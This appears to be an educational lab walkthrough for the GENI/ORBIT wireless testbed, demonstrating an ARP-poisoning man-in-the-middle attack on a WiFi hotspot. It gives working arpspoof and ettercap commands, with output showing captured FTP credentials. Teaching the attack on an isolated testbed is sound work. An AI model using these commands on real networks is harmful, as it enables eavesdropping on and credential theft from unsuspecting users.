This experiment shows how an attacker can capture traffic on a WiFi hotspot with a simple man-in-the-middle attack. 

It should take about 60-120 minutes to run this experiment, but you will need to have [reserved that time](http://geni.orbit-lab.org) in advance. This experiment uses wireless resources (specifically, parts of the grid testbed on [ORBIT](http://geni.orbit-lab.org)), and you can only use wireless resources on GENI during a reservation.

To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). The project lead of the project you belong to must have [enabled wireless for the project](https://portal.geni.net/secure/wimax-enable.php). Finally, you must have [reserved time on the grid testbed at ORBIT](http://geni.orbit-lab.org), and you must run this experiment during your reserved time.

* Skip to [Results](#results)
* Skip to [Run my experiment](#runmyexperiment)


## Background

This experiment shows how a malicious attacker can act as a "man in the middle" to capture traffic on a WiFi hotspot, including potentially sensitive material such as login credentials and private web browsing.

A man in the middle (MITM) attack is one where the attacker (in our example, Mallory) secretly captures and relays communication between two parties who believe they are directly communicating with each other (in our example, Alice and Bob.)

![](/blog/content/images/2016/03/mitm-illustration.svg)


When traffic is switched through the AP, it is encrypted with per-session keys. To decrypt it, the malicious attacker would have had to either capture the initial handshake between client and AP (when the per-session keys were set up in the clear), or force the client to disconnect and reconnect, and capture the new handshake between client and AP.

The attack we're going to try uses a different approach. The specific attack illustrated in this experiment uses a technique known as ARP poisoning. In this experiment, Alice and Bob are connected to a WiFi hotspot, and wish to communicate. Under normal circumstances, they will use [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) requests and replies to find out the physical address (MAC address) to which to direct their traffic. 


In our experiment, the attacker (Mallory) will send gratuitous ARP messages to Alice, giving its own MAC address as the physical address for Bob; and similar ARP messages to Bob, giving its own MAC address as the physical address for Alice.


Then, when Alice and Bob communicate, they will unwittingly treat Mallory as the AP and send all their traffic through her. She will be able to silently view (and potentially modify) all of their communication.

## Results

In our experiment, a malicious attacker was able to make two clients on a WiFi network communicate through a malicious attacker, who can then sniff login credentials used by one of the clients.

After the attacker sent out spoofed ARP messages:

```
0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
```

The clients believe it to be the AP:
```
? (192.168.12.164) at 00:15:6d:84:92:d5 [ether] on wlan0
```

```
? (192.168.12.112) at 00:15:6d:84:92:d5 [ether] on wlan0
```

When one of the clients logs in to the other using FTP, the malicious attacker can capture the login credentials:


```
FTP : 192.168.12.164:21 -> USER: alice  PASS: password
```

## Run my experiment

To run this experiment, you must have a current reservation on the "grid" testbed at [ORBIT](https://geni.orbit-lab.org). At your reserved time, open four terminals and SSH to "grid.orbit-lab.org" in each one, with your GENI keys and using your GENI wireless username. (Your GENI wireless username is typically your GENI username, prefixed by "geni-", e.g. mine is "geni-ffund01".)

The "grid" testbed is a 20x20 grid of nodes with various wireless abilities. Our instructions happen to be written for Atheros wireless cards that use the ath9k driver. (They could apply to some other wireless cards as well, with small modifications.)  To find nodes on the ORBIT grid that have ath9k cards, we log in to [http://geni.orbit-lab.org](http://geni.orbit-lab.org), click on "Control Panel" and then click on "Status Page." We choose the "grid" tab and then check the "Ath9k" box in the "WiFi" panel on the left.

We are interested in groups of four neighboring nodes that are available (shown as a green or blue square) and have an Ath9k card (shown with an X). We can identify at least 11 such groups:

![](/blog/content/images/2016/03/orbit-grid-ath9k.svg)

You will choose one of the groups of nodes and use that group for the rest of this experiment.  The groups are:

```
# dark purple group
node3-18.grid.orbit-lab.org,node7-14.grid.orbit-lab.org,node6-15.grid.orbit-lab.org,node5-16.grid.orbit-lab.org 

# medium blue group
node5-5.grid.orbit-lab.org,node6-6.grid.orbit-lab.org,node7-7.grid.orbit-lab.org,node8-8.grid.orbit-lab.org 

# dark gold group
node7-11.grid.orbit-lab.org,node5-10.grid.orbit-lab.org,node4-11.grid.orbit-lab.org,node10-11.grid.orbit-lab.org 

# dark green group
node17-10.grid.orbit-lab.org,node18-8.grid.orbit-lab.org,node14-11.grid.orbit-lab.org,node14-10.grid.orbit-lab.org 

# dark red group
node10-1.grid.orbit-lab.org,node11-4.grid.orbit-lab.org,node10-4.grid.orbit-lab.org,node8-3.grid.orbit-lab.org 

# grey group
node11-17.grid.orbit-lab.org,node10-17.grid.orbit-lab.org,node11-20.grid.orbit-lab.org,node10-20.grid.orbit-lab.org 

# light blue group
node19-3.grid.orbit-lab.org,node19-4.grid.orbit-lab.org,node20-4.grid.orbit-lab.org,node20-5.grid.orbit-lab.org 

# light pink group
node14-7.grid.orbit-lab.org,node13-8.grid.orbit-lab.org,node11-7.grid.orbit-lab.org,node10-7.grid.orbit-lab.org 

# light green group
node1-10.grid.orbit-lab.org,node1-11.grid.orbit-lab.org,node1-12.grid.orbit-lab.org,node3-13.grid.orbit-lab.org 

# light orange group
node20-10.grid.orbit-lab.org,node20-8.grid.orbit-lab.org,node20-12.grid.orbit-lab.org,node20-7.grid.orbit-lab.org 

# light purple group
node20-16.grid.orbit-lab.org,node20-17.grid.orbit-lab.org,node20-18.grid.orbit-lab.org,node20-19.grid.orbit-lab.org 
```


For convenience, set a shell variable called "GROUP" that contains the list of nodes in your group. For example, if you are using the light purple group, run

```
GROUP=node20-16.grid.orbit-lab.org,node20-17.grid.orbit-lab.org,node20-18.grid.orbit-lab.org,node20-19.grid.orbit-lab.org 
```

in a shell, and make sure to use that shell for the next few commands so that we can refer to "$GROUP" in our commands. Note that there should be no spaces anywhere in the list above.


Next, load the baseline disk image onto all the nodes in your group using

```
if [[ -n "$GROUP" ]]
then 
  omf load -i baseline.ndz -t "$GROUP"
else 
  echo "Please set the GROUP variable"
fi
```


When the image has been loaded onto the nodes, turn them on with

```
if [[ -n "$GROUP" ]]
then 
  omf tell -a on -t "$GROUP"
else 
  echo "Please set the GROUP variable"
fi
```

Finally, use your four terminals to log in to each of the four nodes in your group as "root" user, e.g.

```
ssh root@node1-10
```

etc.

You now have terminals open to four nodes. Designate one node as the AP node, one node as Alice, one node as Bob, and one node as Mallory. In this experiment, Mallory will attempt to silently intercept communications between Alice and Bob, capturing sensitive information such as FTP login credentials.

Bob is going to provide an FTP server. On the node designated as Bob, run

```
apt-get update
apt-get -y install vsftpd
```

Then create an account for Alice so she can log in to Bob's FTP server. On Bob, run

```
useradd -m alice -s /bin/sh
passwd alice
```

and enter a password for "alice" when prompted.

Mallory will need some software to carry out her attack. On the Mallory node, run

```
apt-get update
apt-get -y install dsniff ettercap-text-only
```

Mallory also needs to enable packet forwarding, so that Alice and Bob's traffic will be forwarded to each other through her and they won't notice any disruption. On Mallory, run

```
sysctl -w net.ipv4.ip_forward=1
```

The AP node will also need some software. On the AP, run

```
apt-get update
apt-get -y install git dnsmasq hostapd
```

Then, to set up and start the AP, run

```
modprobe ath9k
ifconfig wlan0 up

git clone https://github.com/oblique/create_ap.git
cd create_ap
make
```

and finally,

```
essid=$(hostname -s)
./create_ap -n wlan0 "$essid" SECRETPASSWORD
```

where "SECRETPASSWORD" is the passphrase. This will create an AP with ESSID equal to the short hostname of the AP node, e.g. "node3-18".

The command above may fail if the node has two wireless interfaces, and the one that is named wlan0 does not support AP mode. In that case, just try

```
ifconfig wlan1 up

essid=$(hostname -s)
./create_ap -n wlan1 "$essid" SECRETPASSWORD
```



Now that the AP is up, Alice, Bob, and Mallory are ready to connect to it. On *each* of those three nodes, run

```
apt-get update
apt-get -y --force-yes install isc-dhcp-client
modprobe ath9k
ifconfig wlan0 up
```

Run

```
iwlist wlan0 scan
```

and make sure you can see the network with ESSID equal to the short hostname of your AP node.

Then run

```
wpa_passphrase ESSID SECRETPASSWORD > wpa.conf
```

where again, "ESSID" is the ESSID of your network and "SECRETPASSWORD" is its passphrase.

Finally, connect to the network with

```
wpa_supplicant -iwlan0 -cwpa.conf -B
```

and then run 

```
dhclient wlan0
```

to get an IP address. On each of the three nodes, run

```
ifconfig wlan0
```

and make a note of the node's MAC address and IP address. 

Make sure all the nodes can ping one another by IP address.

Now that everyone is on the network, Mallory is ready to carry out her attack. For this attack, she will send gratuitous ARP messages, making Alice think that Mallory's MAC address is the Layer 2 address for Bob's IP address, and making Bob think that Mallory's MAC address is the Layer 2 address for Alice's IP address.

To start the ARP spoofing, Mallory will run

```
arpspoof -i wlan0 -t 192.168.12.112 192.168.12.164 &
arpspoof -i wlan0 -t 192.168.12.164 192.168.12.112 &
```

substituting the WiFi IP addresses of Alice and Bob in the commands above. You should see output on the terminal indicating the Mallory is sending gratuitous ARPs. For example, in my case:

```
0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
0:15:6d:84:92:d5 0:15:6d:84:fb:79 0806 42: arp reply 192.168.12.164 is-at 0:15:6d:84:92:d5
0:15:6d:84:92:d5 0:15:6d:84:92:c9 0806 42: arp reply 192.168.12.112 is-at 0:15:6d:84:92:d5
```

Also, if Alice runs

```
arp -a
```

we can see that Alice believes that Bob is at Mallory's MAC address:

```
? (192.168.12.164) at 00:15:6d:84:92:d5 [ether] on wlan0
```

and if we run

```
arp -a
```

on Bob, we'll see that he believes Alice is at Mallory's MAC address:

```
? (192.168.12.112) at 00:15:6d:84:92:d5 [ether] on wlan0
```

Since the ARP poisoning has been successful, Mallory can now intercept traffic between Alice and Bob. Open a new (fifth) terminal, SSH into the grid, and SSH into Mallory. Run

```
ettercap -T -i wlan0
```

Now Mallory will see any interesting traffic passing between Alice and Bob.

Alice is ready to start an FTP session, in which she connects to Bob. On Alice, run


```
ftp
``` 

and then at the FTP prompt, open a connection to Bob with

```
open 192.168.12.164
```

substituting Bob's IP address in the command above.

When prompted, give your name ("alice") and the password you set when you previously ran "passwd alice" on Bob.

Alice should see a successful connection to Bob, and has no idea that the connection was intercepted by Mallory. In fact, if you check the "ettercap" window on Mallory, you should see a line like

```
FTP : 192.168.12.164:21 -> USER: alice  PASS: password
```

in the output, i.e. Mallory has found out Alice's username and password for logging in to Bob.

Mallory can then open an FTP or SSH connection to Bob using Alice's credentials.

Besides for capturing Alice's credentials, Mallory can snoop on any sensitive data that goes over the connection between Alice and Bob. For example, if Alice runs

```
ls /
```

in the FTP session, to list the contents of the root filesystem on Bob, we should see the directory listing in Mallory's terminal.


## Notes